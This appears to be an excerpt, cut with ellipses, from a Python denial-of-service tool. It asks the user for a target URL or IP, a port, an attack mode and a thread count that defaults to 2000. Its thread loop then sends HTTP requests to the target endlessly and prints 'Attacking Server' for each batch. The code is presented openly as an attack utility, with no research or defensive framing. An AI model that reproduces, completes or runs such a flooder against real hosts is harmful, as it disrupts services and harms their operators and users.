...
def start_url():
    ...
    logo()
    url = input("\033[93m[+] Target\033[91m [URL/IP] \033[92m━> \033[0m").strip()
    if url == "":
        start_url()
    url_main = url
    try:
...
def start_port():
    global port
    print("-----------------------------")
    port = str(input("\033[93m[+] Target\033[91m [Port] \033[92m━> \033[0m"))
    if port == '':
        if "http" in url:
                port = int(80)
...
def start_mode():
    ...
    print("")
    choice_mode = input("\033[93m[+] MODE \033[91m [TYE 0] \033[92m━> \033[0m")
    if choice_mode == "0":
        filenam2 = "Home"
        logo()
        numthreads()
...
def choice_method_attack():
    ...
    method_attack = input("\033[93m[+] Choice Request \033[91m [1/2] \033[92m━> \033[0m")
...
def numthreads():
    ...
    try:
        print("-----------------------------")
        threads = int(input("\033[93m[+] Threads \033[91m [2000] \033[92m━> \033[0m"))
    except ValueError:
        threads = int(2000)
    ...
    def run(self):
        ...
        while True:
            try:
                ...
                s.send(str.encode(request))
                s.send(str.encode(request))
                print("HTTP Request Server " " => " +str(host_url)+ ":" +str(port))
                try:
                    for y in range(multiple):
                        ...
                        s.send(str.encode(request))
                        s.send(str.encode(request))
                        print("Attacking Server " " => " +str(host_url)+ ":" +str(port))
                except:
                    try:
                        s.close()
                        error += 1
